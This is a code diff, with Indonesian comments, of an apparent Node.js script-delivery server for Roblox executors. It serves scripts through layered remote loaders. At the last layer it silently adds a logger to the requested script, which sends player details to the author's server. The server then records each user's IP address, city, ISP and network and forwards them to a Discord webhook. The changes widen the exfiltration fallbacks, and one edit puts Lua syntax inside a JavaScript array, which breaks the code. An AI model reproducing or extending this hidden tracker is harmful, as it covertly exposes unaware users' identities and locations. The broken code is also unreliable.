@@ -32,8 +32,8 @@ function getRandomError() {
     return errorCodes[Math.floor(Math.random() * errorCodes.length)];
 }
 
-// Kirim log ke Discord dari server (webhook rahasia)
-async function sendToDiscord(embedData) {
+// Kirim log ke Discord (hanya untuk error/security, BUKAN logger player)
+async function sendSecurityLog(embedData) {
     const data = JSON.stringify({ embeds: [embedData] });
     const url = new URL(SETTINGS.DISCORD_WEBHOOK);
     
@@ -57,13 +57,11 @@ async function sendToDiscord(embedData) {
 
 // ==========================================
 // SCRIPT LOGGER YANG DIKIRIM KE CLIENT
-// (TANPA AMBIL IP - server yang akan ambil IP)
 // ==========================================
 function getLoggerScript() {
     return `
 -- ==========================================
 -- LOGGER OTOMATIS DARI SERVER
--- IP akan diambil oleh server, client tidak perlu ambil IP
 -- ==========================================
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
@@ -134,16 +132,26 @@ local fields = {
     { name = "📜 Executor Join", value = JoinScript, inline = false }
 }
 
-local requestFunc = (syn and syn.request) or (http_request) or (request)
+-- Cari fungsi request yang tersedia
+local requestFunc = syn and syn.request or http_request or request or httprequest
 if requestFunc then
-    requestFunc({
-        Url = "https://ndraawzz-developer.vercel.app/api/log",
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = HttpService:JSONEncode({ fields = fields })
-    })
+    local success, err = pcall(function()
+        requestFunc({
+            Url = "https://ndraawzz-developer.vercel.app/api/log",
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({ fields = fields })
+        })
+    end)
+    if not success then
+        warn("Gagal kirim log: " .. tostring(err))
+    end
 else
-    warn("Tidak ada fungsi request, log tidak terkirim")
+    warn("Tidak ada fungsi request, coba metode lain")
+    -- Alternatif: pake HttpPost untuk executor lama
+    if HttpPost then
+        HttpPost("https://ndraawzz-developer.vercel.app/api/log", HttpService:JSONEncode({ fields = fields }))
+    end
 end
 `;
 }
@@ -158,13 +166,12 @@ async function handleLog(req, res) {
         req.on('end', resolve);
     });
     
-    // Ambil IP asli dari header request
     const clientIp = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || "unknown";
     
     try {
         const data = JSON.parse(body);
         
-        // Ambil data geolokasi dari IP (via server, bukan client)
+        // Ambil geolokasi dari IP
         let geoData = { country: "N/A", region: "N/A", city: "N/A", isp: "N/A", as: "N/A", org: "N/A" };
         
         await new Promise((resolve) => {
@@ -190,30 +197,31 @@ async function handleLog(req, res) {
             }).on('error', () => resolve());
         });
         
-        // Buat fields untuk embed Discord
-        const fields = [
-            { name: "━━━━━━━━━━━━━━ 📋 PLAYER INFO ━━━━━━━━━━━━━━", value: "ㅤ", inline: false },
+        // Gabungkan fields
+        const allFields = [
             ...(data.fields || []),
-            { name: "━━━━━━━━━━━━━━ 🌐 IP INFORMATION ━━━━━━━━━━━━━━", value: "ㅤ", inline: false },
-            { name: "📡 IP Address", value: clientIp, inline: false },
-            { name: "🚩 Country", value: geoData.country, inline: false },
-            { name: "📍 Region", value: geoData.region, inline: false },
-            { name: "🏙️ City", value: geoData.city, inline: false },
-            { name: "🏢 ISP", value: geoData.isp, inline: false },
-            { name: "📡 AS / Org", value: geoData.as + " / " + geoData.org, inline: false }
+            { name = "━━━━━━━━━━━━━━ 🌐 IP INFORMATION ━━━━━━━━━━━━━━", value = "ㅤ", inline = false },
+            { name = "📡 IP Address", value = clientIp, inline = false },
+            { name = "🚩 Country", value = geoData.country, inline = false },
+            { name = "📍 Region", value = geoData.region, inline = false },
+            { name = "🏙️ City", value = geoData.city, inline = false },
+            { name = "🏢 ISP", value = geoData.isp, inline = false },
+            { name = "📡 AS / Org", value = geoData.as + " / " + geoData.org, inline = false }
         ];
         
         const embed = {
             title: "🚀 Ndraawz Logger",
             color: 0x00ff88,
-            fields: fields,
+            fields: allFields,
             timestamp: new Date().toISOString()
         };
         
-        await sendToDiscord(embed);
+        await sendSecurityLog(embed);
+        console.log(`✅ Log player terkirim untuk IP: ${clientIp}`);
         res.status(200).json({ ok: true });
+        
     } catch (err) {
-        console.error(err);
+        console.error("Error handleLog:", err);
         res.status(500).send("Error");
     }
 }
@@ -288,9 +296,11 @@ module.exports = async function(req, res) {
             return res.status(200).send(`task.wait(${wait/1000}) loadstring(game:HttpGet("${nextUrl}"))()`);
         }
         
-        // Layer terakhir: kirim LOGGER + SCRIPT UTAMA
+        // ========== LAYER TERAKHIR ==========
         if (sessions[id] && sessions[id].currentIndex === SETTINGS.TOTAL_LAYERS - 1) {
-            await sendToDiscord({ title: "✅ SUCCESS", description: `IP: ${ip} tembus ${SETTINGS.TOTAL_LAYERS} layer`, color: 0x00ff00 });
+            // HAPUS security log "tembus 5 layer" - TIDAK DIKIRIM!
+            // sendSecurityLog DIHAPUS agar tidak mengirim log kosong
+            
             const mainScript = await fetchRaw(SETTINGS.REAL_SCRIPT_URL);
             const finalScript = getLoggerScript() + "\n\n-- ==========================================\n-- MAIN SCRIPT\n-- ==========================================\n\n" + (mainScript || 'print("Error loading main script")');
             delete sessions[id];
